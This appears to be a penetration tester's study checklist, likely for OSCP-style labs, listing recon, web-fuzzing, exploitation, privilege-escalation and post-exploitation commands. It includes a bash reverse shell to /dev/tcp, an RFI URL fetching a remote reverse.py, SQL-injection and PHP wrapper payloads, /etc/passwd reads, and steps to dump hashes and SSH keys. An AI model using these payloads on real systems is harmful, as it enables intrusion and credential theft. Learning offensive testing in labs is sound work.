# Useful Commands

<pre><code>☑ ffuf -w /opt/SecLists/Discovery/Web-Content/big.txt -u http://ip-address -recursion -recursion-depth 2
☐ ffuf -w /opt/SecLists/Discovery/Web-Content/raft-large-words.txt -u http://ip-address -e .php,.log,.txt,.pl,.cgi,.pdf,.sh, .jsp, .do, .conf, .config
<strong>
</strong><strong>Fuzz LFI 
</strong>☐ ffuf -w /opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u http://ip-address ☐ ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt:FUZZ -u "http://ip-address/blank-page.php?FUZZ=test" -fs 0 ☐ ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt:FUZZ -u "http://ip-address/evil.php?FUZZ=/etc/passwd"" -fs 0
</code></pre>

```
 RPC  
  ☐ rpcclient --user="" --command=enumprivs -N $ip
  ☐ rpcinfo -p $ip
  ☐ MS03-026 Microsoft RPC DCOM Interface Overflow (Critical)
  
 SMTP
  ☐ nc $ip 25 -vvv
  ☐ smtp-user-enum -M RCPT -U /usr/share/wordlists/metasploit/unix_users.txt -t $ip
  ☐ smtp-user-enum -M VRFY -U /opt/SecLists/Discovery/names.txt -t $ip
  ☐ smtp-user-enum -M EXPN -D example.com /usr/share/wordlists/metasploit/unix_users.txt -t $ip
  
 SNMP
  ☐ python3 snmpbrute.py -t $ip -p 161 -f /opt/SecLists/Discovery/SNMP/common-snmp-community-strings.txt
  ☐ hydra -P /opt/SecLists/Discovery/SNMP-common-snmp/community-strings.txt -v $ip snmp
  ☐ snmpcheck -t $ip -c public
  ☐ snmpenum -t $ip
  ☐ snmpwalk -v2c -c $community_string $ip >> snmpv2c.txt
  ☐ snmpwalk -c public -v1 $ip 1 | grep hrSWRunName | cut -d\*\* -f 
  ☐ snmpbulkwalk -c public -v2c $ip >> snmpbulk.txt
  
 NFS 
  ☐ nmap -sV --script=nfs-showmount $ip
  ☐ shoutmount -e $ip
  
 LDAP
  ☐ ldapsearch -h $ip -p $port -x -s base
  ☐ ldapsearch -x -h $ip -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TDL>"

SQL 
	MSSQL
	☐ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth 
	☐ select * from sys.sysusers;
	
	MYSQL
	☐ mysql -u root -p'root' -h $ip -P 3306 

 Automated Web Scans
	☐ autorecon $ip --nmap-append="--min-rate=2500" --exclude-tags="top-100-udp-ports" --dirbuster.threads=30 -vv
	☐ nikto -h http://192.168.179.132
	☐ nikto -ask=no -h http://$ip 2>&1
	☐ whatweb -a 3 $ip
	☐ Zap Crawler
	☐ wpscan --url http://192.168.50.244 --enumerate p --plugins-detection aggressive
	
LFI / RFI
  ☐ Windows LFI 
        ☐ C:\Windows\System32\drivers\etc\hosts
        ☐ C:\inetpub\logs\LogFiles\W3SVC1\
        ☐ C:\inetpub\wwwroot\web.config
  ☐ RFI
        ☐   hxxp://target.com/vuln?page=http://192.168.50.51/reverse.py
        
SQL Injection
  ☐ ' OR 1=1 -- 1 UNION SELECT first_name, password FROM users #


Command Injection
  ☐ http://target.com/vuln?ping=192.168.50.51 ; bash -i >& /dev/tcp/192.168.50.51/1337 0>&1    
  
/.git/
	wget -r http://$ip/.git
	git log
	git show
	git diff
	git fetch

Crying for Help
	☐ telnet -d -d -d -d -d $ip $port
	☐ for file in $(ls /opt/SecLists/Discovery/Web-Content); do ffuf -u http://$ip/FUZZ -w /opt/SecLists/Discovery/Web-Content/$file -e .conf,.php,.sh,.txt ; done		
	☐ update /etc/host. Ip address with computer name, etc.		
	☐ https://securing.dev/posts/hacking-the-oscp-recon/
	
```

Service Scanning

```
WebApp
  ☐	ffuf 
  ☐	gobuster
  ☐	Nessus
  ☐   Nikto
  ☐   wpscan
  ☐   dotdotpwn
  ☐   view source 
  ☐   davtest\cadevar
  ☐   droopscan
  ☐   joomscan
  ☐   LFI\RFI Test
  
Linux\Windows
  ☐   snmpwalk -c public -v1 ipaddress 1
  ☐   smbclient -L //ipaddress
  ☐   enum4linux ipaddress
  ☐   showmount -e ipaddress port
  ☐   rpcinfo
  ☐   Enum4Linux

Anything Else
  ☐   nmap scripts (locate *nse* | grep servicename)
  ☐   hydra
  ☐  MSF Aux Modules
  ☐  Download the softward

  ☐ page=data://text/plain,<?php%20echo%20system('ls');?>"
  ☐ page=php://filter/convert.base64-encode/resource=admin.php
```

Exploitation ☐ Gather Version Numbes ☐ Searchsploit ☐ Default Creds ☐ Creds Previously Gathered ☐ Download the software

Post Exploitation

```
Linux
  ☐   linux-local-enum.sh
  ☐   linuxprivchecker.py
  ☐   linux-exploit-suggestor.sh
  ☐   unix-privesc-check.py

Windows
  ☐   wpc.exe
  ☐   windows-exploit-suggestor.py
  ☐   windows_privesc_check.py
  ☐  	windows-privesc-check2.exe
```

Priv Escalation ☐ acesss internal services (portfwd) ☐ add account ☐ https://guif.re/windowseop - Windows Privilege Escalation ☐ https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS - WinPEAS ☐ Unquoted Paths ☐ DLL Hijacking ☐ Insecure backups

Lateral Movement ☐ Mimikatz - Know the command! ☐ Password Hashes (Hashcat, Pass-The-Hash, Ticket technique) - impacket-psexec, evil-winrm, or xfreerdp

Windows ☐ List of exploits

Linux ☐ sudo su ☐ KernelDB ☐ Searchsploit

Final ☐ Screenshot of IPConfig\WhoamI ☐ Copy proof.txt ☐ Dump hashes ☐ Dump SSH Keys ☐ Delete files
